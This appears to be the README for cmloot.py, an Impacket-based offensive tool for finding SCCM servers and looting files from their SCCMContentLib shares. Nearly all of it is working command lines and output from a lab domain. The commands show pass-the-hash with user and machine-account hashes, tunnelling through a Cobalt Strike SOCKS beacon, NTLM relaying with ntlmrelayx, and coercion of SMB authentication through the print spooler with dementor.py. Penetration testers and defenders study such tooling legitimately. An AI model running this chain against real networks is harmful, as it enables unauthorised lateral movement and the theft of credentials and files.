# cmloot.py

For more information refer to https://www.shelltrail.com/research/cmloot/

## Examples

Enumerate Configuration Manager servers:

```console
user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@not_needed -findsccmservers
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[+] Found 2 SCCM targets. (Written to ./sccmhosts.txt)

user@adpen1:~/cmloot$ head sccmhosts.txt
SCCM01.TEST.LOCAL
SCCM02.TEST.LOCAL
```

Create cmloot inventory for specific host (sccm01):

```console
user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[+] Access to SCCMContentLib on sccm01 
[+] sccmfiles.txt created

user@adpen1:~/cmloot$ head sccmfiles.txt 
\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\cmi2migxml.dll
\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_AppsAndSettings.xml
[...]
```

Create cmloot inventory for multiple hosts:

```console
user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@not_needed -target-file sccmhosts.txt
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[+] Found 2 SCCM targets in sccmhosts.txt
[+] Using target SCCM01.TEST.LOCAL
[+] Access to SCCMContentLib on SCCM01.TEST.LOCAL
[+] sccmfiles.txt created, sorted and uniqed
[+] Using target SCCM02.TEST.LOCAL
[+] sccmfiles.txt exists. Appending to it.
[+] Access to SCCMContentLib on SCCM02.TEST.LOCAL
[+] sccmfiles.txt created, sorted and uniqed
```

Enumerate, build inventory and download:

```console
user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@not_needed -findsccmservers -target-file sccmhosts.txt -cmlootdownload sccmfiles.txt 
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[+] Found 2 SCCM targets. ( Written to ./sccmhosts.txt )

[+] Found 2 SCCM targets in sccmhosts.txt
[+] Using target SCCM01.TEST.LOCAL
[+] sccmfiles.txt exists. Appending to it.
[+] Access to SCCMContentLib on SCCM01.TEST.LOCAL
[+] sccmfiles.txt created, sorted and uniqed
[+] Extensions to download ['XML', 'INI', 'CONFIG']
[+] Creating CMLootOut
[+] Downloaded D204-Config_AppsAndSettings.xml
[+] Downloaded 32AF-Config_AppsOnly.xml
[+] Downloaded B852-Config_SettingsOnly.xml
[+] Downloaded C7F4-MigApp.xml
[+] Downloaded CF90-MigDocs.xml
[+] Downloaded E67A-MigUser.xml
[+] Downloaded F906-ep_defaultpolicy.xml
[+] Using target SCCM02.TEST.LOCAL
[+] sccmfiles.txt exists. Appending to it.
[+] Access to SCCMContentLib on SCCM02.TEST.LOCAL
[+] sccmfiles.txt created, sorted and uniqed
[+] Extensions to download ['XML', 'INI', 'CONFIG']
[+] Already downloaded D204-Config_AppsAndSettings.xml
[+] Already downloaded 32AF-Config_AppsOnly.xml
[+] Already downloaded B852-Config_SettingsOnly.xml
[+] Already downloaded C7F4-MigApp.xml
[+] Already downloaded CF90-MigDocs.xml
[+] Already downloaded E67A-MigUser.xml
[+] Already downloaded F906-ep_defaultpolicy.xml

user@adpen1:~/cmloot$ ls CMLootOut/
32AF-Config_AppsOnly.xml  B852-Config_SettingsOnly.xml
[...]
```

Pass-the-hash with a user account:

```console
user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB CONF PS1 -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[+] Extensions to download ['CAB','CONF','PS1']
[+] Downloaded 1A6D-ccmsetup.cab
[+] Downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
```

Pass-the-hash computer account:

```console
user@adpen1:~/cmloot$ python3 cmloot.py test.local/DEMOMACHINE\$@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:de22a35159cdf85a91db9a67d08f383a
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[+] Extensions to download ['CAB']
[+] Already downloaded 1A6D-ccmsetup.cab
[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
```

Could you use it with proxychains and a Cobalt Strike SOCKS5 beacon? I'm glad you asked...

```console
user@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST.LOCAL/TEST-LOWPRIV@sccm01 -n -cmlootdownload sccmfiles.txt -extensions CAB
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

|S-chain|-<>-127.0.0.1:1080-<><>-100.64.5.221:445-<><>-OK
[+] Extensions to download ['CAB']
[+] Already downloaded 1A6D-ccmsetup.cab
[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
```

With NTLM-relaying? Of course!

Start a `ntlmrelay.py` instance:

```console
user@adpen1:~$ ntlmrelayx.py -socks -t 100.64.5.221 -smb2support --no-http-server --no-wcf-server --no-raw-server  
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off

```

Trigger SMB interaction for example with MS-RPRN FindFirstRprinter
via `dememtor.py`

```console
user@adpen1:~/tools$ python3 dementor.py 100.64.5.25 DEMOMACHINE -u test-lowpriv -p Spettekaka1 -d test.local
[*] connecting to DEMOMACHINE
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
[*] done!
```

SOCKS sessions is now available from `ntlmrelayx.py`

```console
ntlmrelayx> finished_attacks
smb://TEST\DEMOMACHINE$@100.64.5.221
```

Run `cmloot.py` trough proxychains relaying through `ntlmrelayx.py`:

```console
user@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST/DEMOMACHINE\$@100.64.5.221 -n -cmlootdownload sccmfiles.txt -extensions CAB
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

|S-chain|-<>-127.0.0.1:1080-<><>-100.64.5.221:445-<><>-OK
[+] Extensions to download ['CAB']
[+] Already downloaded 1A6D-ccmsetup.cab
[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
```
